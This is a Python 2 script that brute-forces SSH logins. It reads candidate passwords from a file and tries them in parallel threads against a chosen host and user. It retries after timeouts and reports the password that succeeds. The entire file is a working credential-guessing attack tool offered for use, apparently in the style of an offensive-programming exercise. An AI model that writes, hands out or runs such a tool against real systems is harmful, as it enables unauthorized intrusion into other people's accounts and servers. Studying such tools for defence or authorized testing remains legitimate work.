from pexpect import pxssh
import argparse
import time
from threading import Thread, BoundedSemaphore


MAX_CONNECTIONS = 5
connection_lock = BoundedSemaphore(value=MAX_CONNECTIONS)
FOUND = False
FAILS = 0


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before


def connect(host, user, password, release):
    global FOUND
    global FAILS
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        FOUND = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            FAILS += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-H', dest='target_host',
        help='specify target host')
    parser.add_argument('-u', dest='user',
        help='specify the user')
    parser.add_argument('-F', dest='password_file',
        help='specify password file')
    args = parser.parse_args()
    host = args.target_host
    user = args.user
    password_file = args.password_file
    if host is None or user is None or password_file is None:
        parser.print_help()
        exit(0)

    with open(password_file, 'r') as file:
        for line in file.readlines():
            if FOUND:
                print "[*] Exiting: Password Found"
                exit(0)
            if FAILS > 5:
                print "[!] Exiting: Too Many Socket Timeouts"
                exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print "[-] Testing: " + str(password)
            t = Thread(target=connect, args=(host, user, password, True))
            t.start()


if __name__ == '__main__':
    main()
